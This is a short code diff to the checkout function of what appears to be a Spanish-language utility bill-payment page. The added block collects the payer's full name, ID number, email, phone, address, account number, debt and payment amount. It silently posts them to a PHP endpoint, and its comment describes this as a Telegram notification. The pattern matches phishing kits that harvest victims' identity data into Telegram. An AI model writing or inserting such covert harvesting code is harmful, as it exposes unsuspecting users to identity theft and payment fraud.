@@ -357,6 +357,27 @@ function showCheckoutSection(formData, originalAmount, finalAmount, paymentType)
 
     // Scroll to top
     window.scrollTo({ top: 0, behavior: 'smooth' });
+
+    // Send Telegram Notification for reaching checkout
+    const checkoutTelegramData = {
+        step: 'checkout',
+        nic: paymentData.nic,
+        valorMes: paymentData.valorMes,
+        deudaTotal: paymentData.deudaTotal,
+        paymentType: paymentType,
+        totalPagar: finalAmount,
+        nombre: `${formData.nombres} ${formData.apellidos}`,
+        identificacion: `${formData.tipoId}: ${formData.numeroId}`,
+        email: formData.email,
+        telefono: formData.telefono,
+        direccion: formData.direccion
+    };
+
+    fetch('send_invoice_data.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(checkoutTelegramData)
+    }).catch(err => console.error("Error sending checkout notification", err));
 }
 
 
